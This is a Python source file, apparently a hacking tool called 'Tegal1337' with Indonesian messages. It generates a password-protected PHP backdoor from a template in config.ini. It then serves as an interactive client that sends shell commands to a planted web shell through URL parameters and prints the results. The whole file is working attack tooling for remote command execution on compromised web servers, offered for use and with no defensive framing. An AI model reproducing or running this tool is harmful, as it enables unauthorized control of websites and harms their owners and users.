from argparse import ArgumentParser
from configparser import ConfigParser
from requests import get
from time import sleep
from sys import stdout

print (""" 
   ______      ____    
  / __/ / ___ / / __ __
 _\ \/ _ / -_/ / / // /
/___/_//_\__/_/_/\_, / 
                /___/  v.1
--------------------------
Python shell - Tegal1337 |
Generate : 
[+] ./shell.py -g "nama_shell" -p "password"
Connect Server :
[+] ./shell.py -u "url_shell" -p "password"
""")

parser = ArgumentParser()
parser.add_argument("-url", dest="shell_url", action="store",
                    help="Url Website")
parser.add_argument("-g", dest="generate", action="store",
                    help="Generate Payload")
parser.add_argument("-p", dest="passwd", action="store",
                    help="Password Shell")
args = parser.parse_args()

for x in range(50):
	print("/-\|"[x % 4], end="\b")
	stdout.flush()
	sleep(0.1)

if args.generate:
	if args.passwd:
		passwd = str(args.passwd)
	else :
		passwd = 'tegal1337'

	shell_name = str(args.generate)
	shell = shell_name+'.php'
	opfile = open(shell, '+w')
	config = ConfigParser()
	config.read_file(open('config.ini'))

	opfile.write(config['DEFAULT']['code'].replace('{passw}', passwd))
	print ('Backdoor berhasil dibuat dengan nama '+ shell + ' dan password ' + passwd)

if args.shell_url :
	pwd = get(args.shell_url + '?passwd=' + args.passwd + '&c=pwd').text.replace("\n", ""
		)
	pwd += "$ "
	while True:
		command = input(pwd)
		result = get(args.shell_url + '?passwd=' + args.passwd + '&c=' + command).text
		print (result)
